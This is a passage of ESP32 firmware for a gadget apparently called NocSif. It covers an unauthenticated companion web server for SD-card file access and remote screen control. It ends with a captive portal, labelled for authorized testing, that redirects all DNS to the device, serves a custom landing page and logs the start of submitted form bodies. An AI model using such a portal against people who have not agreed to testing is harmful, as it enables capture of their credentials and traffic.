    ESP_LOGI(TAG, "companion fs: GET %s (%lu bytes)", path, (unsigned long)st.st_size);

    esp_err_t r = ESP_OK;
    size_t sent = 0;
    for (;;) {
        if (!nocsif_sdcard_lock(3000)) { r = ESP_FAIL; break; }
        size_t n = fread(buf, 1, COMP_FS_CHUNK, f);
        nocsif_sdcard_unlock();
        if (n == 0) break;
        r = httpd_resp_send_chunk(req, (const char *)buf, n);
        if (r != ESP_OK) break;
        sent += n;
    }
    if (nocsif_sdcard_lock(3000)) { fclose(f); nocsif_sdcard_unlock(); } else { fclose(f); }
    heap_caps_free(buf);
    nocsif_usb_gadget_release_sd();
    if (r == ESP_OK) r = httpd_resp_send_chunk(req, NULL, 0);
    ESP_LOGI(TAG, "companion fs: sent %u/%lu bytes%s", (unsigned)sent, (unsigned long)st.st_size,
             r == ESP_OK ? "" : " (aborted)");
    return r;
}

/* POST /api/upload?p=<dir>&n=<name> — the raw body becomes <dir>/<name>: written to <name>.part in 8 KB
 * pieces (each under a short lock), then renamed over any existing file. On a failure the rest of the
 * body is drained here in big reads (httpd would otherwise purge it 32 bytes at a time) so the browser
 * still receives the reason. */
static esp_err_t comp_fs_upload_post(httpd_req_t *req)
{
    char dir[NOCSIF_SDFS_PATH_MAX], name[NOCSIF_SDFS_NAME_MAX];
    if (!comp_query(req, "p", dir, sizeof dir) || !nocsif_sdfs_path_ok(dir, true)) {
        return comp_fs_err(req, "400 Bad Request", "bad folder");
    }
    if (!comp_query(req, "n", name, sizeof name) || !nocsif_sdfs_name_ok(name)) {
        return comp_fs_err(req, "400 Bad Request", "bad file name");
    }
    char path[NOCSIF_SDFS_PATH_MAX + NOCSIF_SDFS_NAME_MAX + 2];
    char part[sizeof path + 8];
    if (snprintf(path, sizeof path, "%s/%s", dir, name) >= NOCSIF_SDFS_PATH_MAX) {
        return comp_fs_err(req, "400 Bad Request", "path too long");
    }
    snprintf(part, sizeof part, "%s.part", path);
    const char *why = nocsif_sdfs_claim();
    if (why) return comp_fs_err(req, "503 Service Unavailable", why);

    FILE *f = NULL;
    if (nocsif_sdcard_lock(1500)) { f = fopen(part, "wb"); nocsif_sdcard_unlock(); }
    if (!f) { nocsif_usb_gadget_release_sd(); return comp_fs_err(req, "500 Internal Server Error", "cannot write to the card"); }
    uint8_t *buf = heap_caps_malloc(COMP_FS_CHUNK, MALLOC_CAP_SPIRAM);
    const char *err = buf ? NULL : "out of memory";
    size_t total = req->content_len, got = 0;
    int timeouts = 0;
    while (!err && got < total) {
        size_t want = total - got;
        if (want > COMP_FS_CHUNK) want = COMP_FS_CHUNK;
        int r = httpd_req_recv(req, (char *)buf, want);
        if (r == HTTPD_SOCK_ERR_TIMEOUT) { if (++timeouts > 6) err = "upload stalled"; continue; }
        if (r <= 0) { err = "connection dropped"; break; }
        timeouts = 0;
        if (!nocsif_sdcard_lock(3000)) { err = "card busy"; break; }
        size_t w = fwrite(buf, 1, (size_t)r, f);
        nocsif_sdcard_unlock();
        if (w != (size_t)r) { err = "card write failed (full?)"; break; }
        got += (size_t)r;
    }
    if (err && buf && got < total) {                          /* drain so the client sees the reason */
        int spins = 0;
        while (got < total && spins < 200) {
            size_t want = total - got;
            if (want > COMP_FS_CHUNK) want = COMP_FS_CHUNK;
            int r = httpd_req_recv(req, (char *)buf, want);
            if (r == HTTPD_SOCK_ERR_TIMEOUT) { spins++; continue; }
            if (r <= 0) break;
            got += (size_t)r;
        }
    }
    if (buf) heap_caps_free(buf);
    if (nocsif_sdcard_lock(3000)) {
        fclose(f);
        if (!err) {
            remove(path);
            if (rename(part, path) != 0) err = "cannot replace the file";
        }
        if (err) remove(part);
        nocsif_sdcard_unlock();
    } else {
        fclose(f);
        if (!err) err = "card busy";
    }
    nocsif_usb_gadget_release_sd();
    ESP_LOGI(TAG, "companion fs: upload %s %u/%u bytes%s%s", path, (unsigned)got, (unsigned)total,
             err ? " FAILED: " : "", err ? err : "");
    if (err) return comp_fs_err(req, "500 Internal Server Error", err);
    char js[64];
    snprintf(js, sizeof js, "{\"ok\":true,\"size\":%u}", (unsigned)got);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    return httpd_resp_sendstr(req, js);
}

/* POST /api/delete {"p":"/sd/..."} — one regular file. Directories are refused (no recursive delete
 * from a phone). The body/path buffers are wider than the jail cap so a long path is REJECTED, never
 * silently truncated onto a different name. */
static esp_err_t comp_fs_delete_post(httpd_req_t *req)
{
    char body[NOCSIF_SDFS_PATH_MAX + 48], path[NOCSIF_SDFS_PATH_MAX + 48];
    comp_read_body(req, body, sizeof body);
    if (!comp_json_str(body, "p", path, sizeof path) || !nocsif_sdfs_path_ok(path, false)) {
        return comp_fs_err(req, "400 Bad Request", "bad path");
    }
    const char *why = nocsif_sdfs_claim();
    if (why) return comp_fs_err(req, "503 Service Unavailable", why);
    const char *err = NULL, *status = "400 Bad Request";
    if (nocsif_sdcard_lock(1500)) {
        struct stat st;
        if (stat(path, &st) != 0)          { err = "no such file"; status = "404 Not Found"; }
        else if (!S_ISREG(st.st_mode))     { err = "folders can't be deleted here"; }
        else if (remove(path) != 0)        { err = "delete failed"; status = "500 Internal Server Error"; }
        nocsif_sdcard_unlock();
    } else {
        err = "card busy"; status = "503 Service Unavailable";
    }
    nocsif_usb_gadget_release_sd();
    ESP_LOGI(TAG, "companion fs: delete %s%s%s", path, err ? " FAILED: " : "", err ? err : "");
    if (err) return comp_fs_err(req, status, err);
    return comp_reply(req, true);
}

/* ---- P3 live-state WebSocket (/ws) ------------------------------------------------------------ */
static void ws_add_fd(int fd)
{
    for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i] == fd) return;   /* already tracked */
    for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i] == 0) { s_ws_fds[i] = fd; return; }
    /* table full — drop the oldest so a fresh client always connects */
    s_ws_fds[0] = fd;
}
static void ws_del_fd(int fd)
{
    for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i] == fd) { s_ws_fds[i] = 0; return; }
}

int nocsif_wifi_companion_ws_clients(void)
{
    int n = 0;
    for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i]) n++;
    return n;
}

/* P3 screen mirror: the UI (LVGL task) hands a fresh RGB565 thumbnail here; we frame it (8-byte header)
 * into the PSRAM buffer under the mutex and bump the seq so the push loop sends it once to each client. */
void nocsif_wifi_companion_publish_thumb(const uint8_t *rgb565_le, int w, int h)
{
    if (!s_comp_active || !rgb565_le || w <= 0 || h <= 0) return;
    int payload = w * h * 2;
    if (payload > COMP_THUMB_MAX - 8) return;
    if (!s_thumb_mtx) { s_thumb_mtx = xSemaphoreCreateMutex(); if (!s_thumb_mtx) return; }
    if (!s_thumb)     { s_thumb = heap_caps_malloc(COMP_THUMB_MAX, MALLOC_CAP_SPIRAM); if (!s_thumb) return; }
    if (xSemaphoreTake(s_thumb_mtx, pdMS_TO_TICKS(50))) {
        s_thumb[0] = 'N'; s_thumb[1] = 'F';
        s_thumb[2] = (uint8_t)(w & 0xff); s_thumb[3] = (uint8_t)((w >> 8) & 0xff);
        s_thumb[4] = (uint8_t)(h & 0xff); s_thumb[5] = (uint8_t)((h >> 8) & 0xff);
        s_thumb[6] = 0;  /* fmt: 0 = RGB565 little-endian */
        s_thumb[7] = 0;
        memcpy(s_thumb + 8, rgb565_le, payload);
        s_thumb_len = payload + 8;
        s_thumb_seq++;
        xSemaphoreGive(s_thumb_mtx);
    }
}

static esp_err_t comp_ws_handler(httpd_req_t *req)
{
    if (req->method == HTTP_GET) {                 /* handshake done → track this socket for pushes */
        ws_add_fd(httpd_req_to_sockfd(req));
        return ESP_OK;
    }
    /* Interactive uplink (phone → watch): small JSON control messages on the same socket.
     *   {"t":"m","x":..,"y":..,"s":0/1}  touch move / press-state (watch-space px)
     *   {"t":"b","k":"fn"|"pwr","a":"s"|"l"}  side button (short / long)
     *   {"t":"c","on":0/1}  casting (blank the watch, phone-as-display) */
    uint8_t buf[128];
    httpd_ws_frame_t f = { .type = HTTPD_WS_TYPE_TEXT, .payload = buf };
    if (httpd_ws_recv_frame(req, &f, sizeof buf - 1) != ESP_OK) {
        /* The peer reset / closed the socket (Safari backgrounding, a page navigation, a download
         * hand-off). Returning ESP_OK here made httpd re-poll the DEAD socket in a tight loop (recv
         * errno 104 then 128, ~3 log lines per ms, CPU 1 pinned) until the task-wdt fired on the starved
         * IDLE task — the 2026-09-08 reset + the "everything lags" report. Fail the request so httpd
         * closes the session; the page's ws.onclose reconnects. */
        ws_del_fd(httpd_req_to_sockfd(req));
        return ESP_FAIL;
    }
    if (f.len > 0 && f.type == HTTPD_WS_TYPE_TEXT) {
        buf[f.len] = '\0';
        cJSON *root = cJSON_Parse((const char *)buf);
        if (root) {
            cJSON *t = cJSON_GetObjectItem(root, "t");
            char kind = (cJSON_IsString(t) && t->valuestring) ? t->valuestring[0] : 0;
            if (kind == 'm' && s_comp_touch_fn) {
                cJSON *x = cJSON_GetObjectItem(root, "x");
                cJSON *y = cJSON_GetObjectItem(root, "y");
                cJSON *s = cJSON_GetObjectItem(root, "s");
                s_comp_touch_fn(cJSON_IsNumber(x) ? (int)x->valuedouble : 0,
                                cJSON_IsNumber(y) ? (int)y->valuedouble : 0,
                                cJSON_IsNumber(s) ? (int)s->valuedouble : 0);
            } else if (kind == 'b') {
                cJSON *k = cJSON_GetObjectItem(root, "k");
                cJSON *a = cJSON_GetObjectItem(root, "a");
                const char *ks = (cJSON_IsString(k) && k->valuestring) ? k->valuestring : "";
                bool lng = (cJSON_IsString(a) && a->valuestring && a->valuestring[0] == 'l');
                char arg[12];
                snprintf(arg, sizeof arg, "%s.%s", (ks[0] == 'p') ? "pwr" : "fn", lng ? "long" : "short");
                comp_dispatch(NOCSIF_COMPANION_CMD_BUTTON, arg);
            } else if (kind == 'c') {
                cJSON *on = cJSON_GetObjectItem(root, "on");
                comp_dispatch(NOCSIF_COMPANION_CMD_CAST,
                              (cJSON_IsNumber(on) && on->valuedouble != 0) ? "1" : "0");
            }
            cJSON_Delete(root);
        }
    }
    if (f.type == HTTPD_WS_TYPE_CLOSE) ws_del_fd(httpd_req_to_sockfd(req));
    return ESP_OK;
}

/* A push failed on this socket: a timed-out send (errno 11 after the 5 s send-wait — the phone stopped
 * draining) leaves a PARTIAL frame on the wire, so the stream is unusable either way. Drop the fd from
 * the push table AND close the session so the page's ws.onclose fires and it reconnects cleanly (before,
 * only the table entry was dropped: the page kept a silent zombie socket and never reconnected). */
static void ws_drop(httpd_handle_t hd, int fd)
{
    ws_del_fd(fd);
    httpd_sess_trigger_close(hd, fd);
}

/* Backpressure for the mirror: true while a thumbnail send is queued/in flight. The 80 ms tick used to
 * queue a fresh send for EVERY new frame regardless; on a congested AP link the httpd task then sat in
 * blocking sends back-to-back (each up to the 5 s send-wait) with a pile of queued work items behind it
 * — every command, touch and page request waited in that line. Now a new frame is only queued once the
 * previous send completed, so the frame rate adapts to what the link actually carries. */
static volatile bool s_thumb_busy;

/* Runs on the httpd task (queued from the timer): send one live-state frame to one client. */
typedef struct { httpd_handle_t hd; int fd; } ws_send_ctx_t;
static void ws_send_worker(void *arg)
{
    ws_send_ctx_t *c = arg;
    char *js = malloc(512);
    if (js) {
        js[0] = '\0';
        if (s_comp_state_fn) s_comp_state_fn(js, 512);
        if (js[0]) {
            httpd_ws_frame_t f = { .type = HTTPD_WS_TYPE_TEXT, .payload = (uint8_t *)js, .len = strlen(js) };
            if (httpd_ws_send_frame_async(c->hd, c->fd, &f) != ESP_OK) ws_drop(c->hd, c->fd);
        }
        free(js);
    }
    free(c);
}
/* Runs on the httpd task: copy the current thumbnail out under the mutex, then send it as one BINARY
 * frame. Copied (not sent under the lock) so a slow socket never blocks the UI's next publish. */
static void ws_send_thumb_worker(void *arg)
{
    ws_send_ctx_t *c = arg;
    uint8_t *cpy = NULL; int len = 0;
    if (s_thumb_mtx && xSemaphoreTake(s_thumb_mtx, pdMS_TO_TICKS(50))) {
        if (s_thumb && s_thumb_len > 0) {
            cpy = malloc(s_thumb_len);
            if (cpy) { memcpy(cpy, s_thumb, s_thumb_len); len = s_thumb_len; }
        }
        xSemaphoreGive(s_thumb_mtx);
    }
    if (cpy) {
        httpd_ws_frame_t f = { .type = HTTPD_WS_TYPE_BINARY, .payload = cpy, .len = (size_t)len };
        if (httpd_ws_send_frame_async(c->hd, c->fd, &f) != ESP_OK) ws_drop(c->hd, c->fd);
        free(cpy);
    }
    free(c);
    s_thumb_busy = false;
}

/* The timer fires fast (~80 ms) to keep the interactive mirror smooth: send a NEW thumbnail frame every
 * tick (when the previous one has gone out — s_thumb_busy), but the (small) state JSON only every ~6th
 * tick (~480 ms) — state is for the dashboard/keyboard, not the frame rate. */
static void ws_push_cb(void *arg)
{
    (void)arg;
    if (!s_comp_httpd) return;
    static uint32_t tick;
    tick++;
    bool thumb_new = (s_thumb && s_thumb_len > 0 && s_thumb_seq != s_thumb_sent_seq && !s_thumb_busy);
    bool send_state = (tick % 6) == 0;
    bool thumb_queued = false;
    for (int i = 0; i < COMP_WS_MAX; i++) {
        int fd = s_ws_fds[i];
        if (fd == 0) continue;
        if (send_state) {
            ws_send_ctx_t *c = malloc(sizeof *c);
            if (c) { c->hd = s_comp_httpd; c->fd = fd;
                     if (httpd_queue_work(s_comp_httpd, ws_send_worker, c) != ESP_OK) free(c); }
        }
        if (thumb_new) {
            ws_send_ctx_t *tc = malloc(sizeof *tc);
            if (tc) { tc->hd = s_comp_httpd; tc->fd = fd;
                      s_thumb_busy = true;   /* before the post: the worker may finish on the other core first */
                      if (httpd_queue_work(s_comp_httpd, ws_send_thumb_worker, tc) == ESP_OK) thumb_queued = true;
                      else { free(tc); s_thumb_busy = false; } }
        }
    }
    if (thumb_queued) s_thumb_sent_seq = s_thumb_seq;
}

static void comp_ssid_build(void)
{
    const char *name = nocsif_settings_device_name();
    snprintf(s_comp_ssid, sizeof s_comp_ssid, "%s", (name && name[0]) ? name : "NocSif");
}

static void companion_mdns_up(void)
{
    if (s_mdns_up) {
        return;
    }
    if (mdns_init() != ESP_OK) {
        ESP_LOGW(TAG, "companion: mdns_init failed (nocsif.local unavailable; use the AP IP)");
        return;
    }
    mdns_hostname_set(COMP_HOST);
    mdns_instance_name_set("NocSif Companion");
    mdns_service_add(NULL, "_http", "_tcp", 80, NULL, 0);
    s_mdns_up = true;
}

static void companion_mdns_down(void)
{
    if (!s_mdns_up) {
        return;
    }
    mdns_free();
    s_mdns_up = false;
}

static void companion_httpd_up(void)
{
    if (s_comp_httpd) {
        return;
    }
    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
    hc.server_port      = 80;
    hc.stack_size       = 8192;
    hc.task_caps        = MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT;   /* P4: PSRAM stack — see the header note */
    hc.max_uri_handlers = 20;
    hc.lru_purge_enable = true;
    if (httpd_start(&s_comp_httpd, &hc) != ESP_OK) {
        s_comp_httpd = NULL;
        ESP_LOGE(TAG, "companion: httpd_start failed");
        return;
    }
    httpd_uri_t root   = { .uri = "/",            .method = HTTP_GET,  .handler = comp_root_get };
    httpd_uri_t ping   = { .uri = "/api/ping",    .method = HTTP_GET,  .handler = comp_ping_get };
    httpd_uri_t menu   = { .uri = "/api/menu",    .method = HTTP_GET,  .handler = comp_menu_get };
    httpd_uri_t launch = { .uri = "/api/launch",  .method = HTTP_POST, .handler = comp_launch_post };
    httpd_uri_t type   = { .uri = "/api/type",    .method = HTTP_POST, .handler = comp_type_post };
    httpd_uri_t key    = { .uri = "/api/key",     .method = HTTP_POST, .handler = comp_key_post };
    httpd_uri_t back   = { .uri = "/api/back",    .method = HTTP_POST, .handler = comp_back_post };
    httpd_uri_t home   = { .uri = "/api/home",    .method = HTTP_POST, .handler = comp_home_post };
    httpd_uri_t bright = { .uri = "/api/brightness", .method = HTTP_POST, .handler = comp_brightness_post };
    httpd_uri_t vol    = { .uri = "/api/volume",  .method = HTTP_POST, .handler = comp_volume_post };
    httpd_uri_t ws     = { .uri = "/ws", .method = HTTP_GET, .handler = comp_ws_handler, .is_websocket = true };
    httpd_uri_t fs     = { .uri = "/api/fs",     .method = HTTP_GET,  .handler = comp_fs_list_get };     /* P4 */
    httpd_uri_t file   = { .uri = "/api/file",   .method = HTTP_GET,  .handler = comp_fs_file_get };
    httpd_uri_t upload = { .uri = "/api/upload", .method = HTTP_POST, .handler = comp_fs_upload_post };
    httpd_uri_t del    = { .uri = "/api/delete", .method = HTTP_POST, .handler = comp_fs_delete_post };
    httpd_register_uri_handler(s_comp_httpd, &root);
    httpd_register_uri_handler(s_comp_httpd, &ping);
    httpd_register_uri_handler(s_comp_httpd, &menu);
    httpd_register_uri_handler(s_comp_httpd, &launch);
    httpd_register_uri_handler(s_comp_httpd, &type);
    httpd_register_uri_handler(s_comp_httpd, &key);
    httpd_register_uri_handler(s_comp_httpd, &back);
    httpd_register_uri_handler(s_comp_httpd, &home);
    httpd_register_uri_handler(s_comp_httpd, &bright);
    httpd_register_uri_handler(s_comp_httpd, &vol);
    httpd_register_uri_handler(s_comp_httpd, &ws);
    httpd_register_uri_handler(s_comp_httpd, &fs);
    httpd_register_uri_handler(s_comp_httpd, &file);
    httpd_register_uri_handler(s_comp_httpd, &upload);
    httpd_register_uri_handler(s_comp_httpd, &del);

    /* P3 live push: fire the state frame ~2×/s to every connected /ws client. */
    memset(s_ws_fds, 0, sizeof s_ws_fds);
    s_thumb_busy = false;   /* a send queued on a server that was stopped never ran — start clean */
    const esp_timer_create_args_t ta = { .callback = ws_push_cb, .name = "comp_ws" };
    if (esp_timer_create(&ta, &s_ws_timer) == ESP_OK) {
        esp_timer_start_periodic(s_ws_timer, 80000);    /* 80 ms — smooth interactive mirror (~12 fps) */
    }
}

static void companion_httpd_down(void)
{
    if (s_ws_timer) {
        esp_timer_stop(s_ws_timer);
        esp_timer_delete(s_ws_timer);
        s_ws_timer = NULL;
    }
    memset(s_ws_fds, 0, sizeof s_ws_fds);
    if (!s_comp_httpd) {
        return;
    }
    httpd_stop(s_comp_httpd);
    s_comp_httpd = NULL;
}

/* Drop just the companion HTTP + mDNS layer and clear its AP overrides — leaves the AP running (like
 * portal_stop). Called by ap_teardown (so ANY AP drop, e.g. a STA scan/join, removes the surface
 * cleanly) and by do_companion_off. Idempotent. Does NOT tear the AP down (the caller decides). */
static void companion_stop(void)
{
    if (!s_comp_active && s_comp_httpd == NULL && !s_mdns_up) {
        return;
    }
    companion_httpd_down();
    companion_mdns_down();
    s_comp_active   = false;
    s_comp_owns_ap  = false;
    s_ap_ssid_ov[0] = '\0';
    s_ap_pass_ov[0] = '\0';
    ESP_LOGI(TAG, "companion surface stopped");
}

static void do_companion_on(void)
{
    if (s_comp_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        publish_status("err");
        publish_detail("Companion unavailable in safe mode.");
        return;
    }

    /* Single radio: the companion AP is exclusive with the promiscuous monitor/parser and the captive
     * portal (which also owns port 80). Stop them first. Any OPEN software AP that was up is cycled so
     * companion always owns a clean open AP (simple invariant). Bluetooth stays as it is. */
    monitor_teardown();
    portal_stop();
    if (s_ap_active) {
        do_ap_off();
    }

    comp_ssid_build();

    /* Stage the companion SSID + optional WPA2 password, then reuse the shipped AP bring-up. A password
     * of < 8 chars (WPA2's minimum) is treated as none → OPEN, so a stray short value can't brick join. */
    snprintf(s_ap_ssid_ov, sizeof s_ap_ssid_ov, "%s", s_comp_ssid);
    nocsif_settings_get_str(K_COMP_PW, s_ap_pass_ov, sizeof s_ap_pass_ov, "");
    if (strlen(s_ap_pass_ov) < 8) s_ap_pass_ov[0] = '\0';
    do_ap_on();
    if (!s_ap_active) {                               /* AP failed -> roll the override back */
        s_ap_ssid_ov[0] = '\0';
        s_ap_pass_ov[0] = '\0';
        publish_status("err");
        publish_detail("Companion AP failed to start.");
        return;
    }
    s_comp_owns_ap = true;

    companion_mdns_up();                              /* best-effort: AP IP still works without it */
    companion_httpd_up();
    if (s_comp_httpd == NULL) {                       /* HTTP is mandatory -> roll the whole session back */
        bool owned = s_comp_owns_ap;
        companion_stop();                             /* mDNS down + clear overrides (httpd already null) */
        if (owned) {
            do_ap_off();
        }
        publish_status("err");
        publish_detail("Companion HTTP failed to start.");
        return;
    }

    s_comp_active = true;
    ESP_LOGW(TAG, "companion ON: ssid \"%s\" open http=80 mdns=%s ip %s; int-dma free=%u largest=%u",
             s_comp_ssid, s_mdns_up ? "up" : "off", s_ap_ip[0] ? s_ap_ip : "?",
             (unsigned)nocsif_int_dma_free(),
             (unsigned)nocsif_int_dma_largest());
    refresh_strings();
}

static void do_companion_off(void)
{
    bool owned = s_comp_owns_ap;
    companion_stop();                                 /* drop HTTP + mDNS, clear overrides */
    if (owned) {
        do_ap_off();                                  /* tear the AP down + restore the STA link */
    }
    refresh_strings();
}

/* Published companion state — LVGL-task-safe reads of worker-written state (single writer + the
 * s_comp_active flag as a barrier, mirroring the portal getters). */
bool        nocsif_wifi_companion_active(void)  { return s_comp_active; }
const char *nocsif_wifi_companion_ssid(void)    { return s_comp_ssid; }
const char *nocsif_wifi_companion_url(void)     { return s_mdns_up ? "nocsif.local" : (s_ap_ip[0] ? s_ap_ip : "nocsif.local"); }
int         nocsif_wifi_companion_clients(void) { return s_comp_active ? nocsif_wifi_ap_client_count() : 0; }

const char *nocsif_wifi_companion_status_str(void)
{
    static char s[80];
    if (s_comp_active) {
        int c = nocsif_wifi_ap_client_count();
        snprintf(s, sizeof s, "on \xC2\xB7 %s \xC2\xB7 %d client%s",
                 nocsif_wifi_companion_url(), c, c == 1 ? "" : "s");
    } else {
        snprintf(s, sizeof s, "off \xC2\xB7 tap Start");
    }
    return s;
}

const char *nocsif_wifi_companion_tag_str(void)
{
    static char s[24];
    if (!s_comp_active) {
        return "off";
    }
    int c = nocsif_wifi_ap_client_count();
    if (c > 0) {
        snprintf(s, sizeof s, "on \xC2\xB7 %d", c);
    } else {
        snprintf(s, sizeof s, "on");
    }
    return s;
}

/* ---- captive portal (M5-P5·4, active — authorized testing) --------------------------- */

static const char PORTAL_DEFAULT_HTML[] =
    "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>NocSif</title></head><body style=\"font-family:sans-serif;background:#0d0d10;color:#d8d8dc;"
    "text-align:center;padding:2.4em 1.2em\"><h2>NocSif test access point</h2>"
    "<p>You have joined a software access point used for authorized network testing.</p>"
    "<p>No action is required.</p></body></html>";

/* Prime the selected landing-page filename from NVS once (idempotent). "" = the built-in notice. */
static void portal_sel_ensure_loaded(void)
{
    if (s_portal_sel_loaded) {
        return;
    }
    s_portal_sel_loaded = true;
    char buf[PT_SEL_MAX];
    nocsif_settings_get_str(K_PT_PAGE, buf, sizeof buf, "");
    portENTER_CRITICAL(&s_portal_mux);
    snprintf(s_portal_page_sel, sizeof s_portal_page_sel, "%s", buf);
    portEXIT_CRITICAL(&s_portal_mux);
}

/* DNS redirector: answer every query with the AP's own IPv4 so a client's connectivity probe resolves
 * to the watch. Owns its socket (a short rx timeout lets it poll the run flag); closes + self-deletes
 * on stop. A single-question query is the common case; the answer is appended after the echoed query. */
static void portal_dns_task(void *arg)
{
    (void)arg;
    int sock = s_dns_sock;
    uint32_t apip = 0;                                  /* network-order AP IPv4 */
    esp_netif_ip_info_t ip;
    if (s_ap_netif && esp_netif_get_ip_info(s_ap_netif, &ip) == ESP_OK) {
        apip = ip.ip.addr;
    }
    struct timeval tv = { .tv_sec = 0, .tv_usec = 400000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);

    uint8_t buf[512];
    while (s_dns_run) {
        struct sockaddr_in cli;
        socklen_t cl = sizeof cli;
        int n = recvfrom(sock, buf, sizeof buf, 0, (struct sockaddr *)&cli, &cl);
        if (n < 12 || n + 16 > (int)sizeof buf) {       /* timeout (-1) / runt / no room -> re-poll */
            continue;
        }
        buf[2] |= 0x80;                                 /* QR = response */
        buf[3] = 0x00;                                  /* RA / RCODE cleared */
        buf[6] = 0x00; buf[7] = 0x01;                   /* ANCOUNT = 1 */
        buf[8] = buf[9] = buf[10] = buf[11] = 0x00;     /* NSCOUNT / ARCOUNT = 0 */
        int p = n;                                      /* append the answer after the echoed question */
        buf[p++] = 0xC0; buf[p++] = 0x0C;               /* NAME -> pointer to the question (offset 12) */
        buf[p++] = 0x00; buf[p++] = 0x01;               /* TYPE A */
        buf[p++] = 0x00; buf[p++] = 0x01;               /* CLASS IN */
        buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x3C;   /* TTL 60 s */
        buf[p++] = 0x00; buf[p++] = 0x04;               /* RDLENGTH 4 */
        memcpy(&buf[p], &apip, 4); p += 4;              /* RDATA = AP IPv4 */
        sendto(sock, buf, p, 0, (struct sockaddr *)&cli, cl);
    }
    close(sock);
    s_dns_sock = -1;
    s_dns_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

/* Load the landing page from /sd once (httpd task; 8 KB stack fits FATFS). Also picks a fresh
 * portal-NNN.log name for this session. Best-effort — falls back to the built-in notice page. */
static void portal_load_page_once(void)
{
    bool go = false;
    portENTER_CRITICAL(&s_portal_mux);
    if (!s_portal_page_tried) { s_portal_page_tried = true; go = true; }
    portEXIT_CRITICAL(&s_portal_mux);
    if (!go || !s_portal_sd_ok) {
        return;
    }
    if (!nocsif_sdcard_lock(1000)) {
        return;
    }
    mkdir("/sd/nocsif", 0777);
    mkdir("/sd/nocsif/wifi", 0777);
    mkdir(PORTAL_DIR, 0777);
    for (int i = 0; i < 1000; i++) {                    /* first unused portal-NNN.log */
        char pth[64];
        snprintf(pth, sizeof pth, "/sd/nocsif/wifi/portal-%03d.log", i);
        FILE *t = fopen(pth, "r");
        if (t) { fclose(t); continue; }
        snprintf(s_portal_logpath, sizeof s_portal_logpath, "%s", pth);
        break;
    }

    char sel[PT_SEL_MAX];                               /* the chosen page filename (copy off-lock) */
    portENTER_CRITICAL(&s_portal_mux);
    memcpy(sel, s_portal_page_sel, sizeof sel);
    portEXIT_CRITICAL(&s_portal_mux);

    if (sel[0]) {                                       /* "" -> serve the built-in notice */
        char path[96];
        snprintf(path, sizeof path, "%s/%s", PORTAL_DIR, sel);
        FILE *f = fopen(path, "rb");
        if (f) {
            fseek(f, 0, SEEK_END);
            long sz = ftell(f);
            fseek(f, 0, SEEK_SET);
            if (sz > 0 && sz <= PORTAL_PAGE_MAX) {
                char *b = heap_caps_malloc((size_t)sz, MALLOC_CAP_SPIRAM);
                if (b) {
                    size_t rd = fread(b, 1, (size_t)sz, f);
                    s_portal_page = b;
                    s_portal_page_len = (int)rd;
                }
            }
            fclose(f);
        } else {
            ESP_LOGW(TAG, "portal: page %s not found; serving built-in", path);
        }
    }
    nocsif_sdcard_unlock();
}

/* Record one client interaction: RAM ring (for the UI) + append to the session log on /sd. */
static void portal_log_request(httpd_req_t *req, const char *method, const char *extra)
{
    char ips[16] = "?";
    int fd = httpd_req_to_sockfd(req);
    struct sockaddr_in6 sa;                             /* buffer fits v4 + v6 */
    socklen_t sl = sizeof sa;
    if (getpeername(fd, (struct sockaddr *)&sa, &sl) == 0 && sa.sin6_family == AF_INET) {
        struct sockaddr_in *s4 = (struct sockaddr_in *)&sa;
        uint32_t a = ntohl(s4->sin_addr.s_addr);
        snprintf(ips, sizeof ips, "%u.%u.%u.%u", (unsigned)((a >> 24) & 0xFF),
                 (unsigned)((a >> 16) & 0xFF), (unsigned)((a >> 8) & 0xFF), (unsigned)(a & 0xFF));
    }
    char q[48] = "";
    size_t ql = httpd_req_get_url_query_len(req);
    if (ql > 0 && ql < sizeof q) {
        httpd_req_get_url_query_str(req, q, sizeof q);
    }

    char line[PORTAL_LOG_LINE];
    snprintf(line, sizeof line, "%s %s %.24s%s%s%s%s", ips, method, req->uri,
             q[0] ? "?" : "", q,
             (extra && extra[0]) ? " " : "", (extra && extra[0]) ? extra : "");

    portENTER_CRITICAL(&s_portal_mux);
    snprintf(s_portal_log[s_portal_log_head], PORTAL_LOG_LINE, "%s", line);
    s_portal_log_head = (s_portal_log_head + 1) % PORTAL_LOG_MAX;
    if (s_portal_log_cnt < PORTAL_LOG_MAX) s_portal_log_cnt++;
    portEXIT_CRITICAL(&s_portal_mux);
    s_portal_hits++;
    s_portal_gen++;

    if (s_portal_sd_ok && s_portal_logpath[0] && nocsif_sdcard_lock(500)) {
        FILE *f = fopen(s_portal_logpath, "a");
        if (f) {
            fprintf(f, "%lu %s\n", (unsigned long)(esp_timer_get_time() / 1000), line);
            fclose(f);
        }
        nocsif_sdcard_unlock();
    }
}

/* Wildcard handler: serve the landing page for every path (so client OSes surface the portal). */
static esp_err_t portal_http_req(httpd_req_t *req)
{
    portal_load_page_once();

    char extra[24] = "";
    if (req->method == HTTP_POST && req->content_len > 0) {
        char body[96];
        int want = (req->content_len < sizeof body - 1) ? (int)req->content_len : (int)(sizeof body - 1);
        int got = httpd_req_recv(req, body, want);
        if (got > 0) { body[got] = '\0'; snprintf(extra, sizeof extra, "%.20s", body); }
    }
    portal_log_request(req, req->method == HTTP_POST ? "POST" : "GET", extra);

    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_status(req, "200 OK");
    if (s_portal_page && s_portal_page_len > 0) {
        httpd_resp_send(req, s_portal_page, s_portal_page_len);
    } else {
        httpd_resp_send(req, PORTAL_DEFAULT_HTML, HTTPD_RESP_USE_STRLEN);
    }
    return ESP_OK;
}

static void portal_stop(void)
{
    if (!s_portal_active && s_httpd == NULL && s_dns_task == NULL && s_dns_sock < 0) {
        return;
    }
    s_portal_active = false;

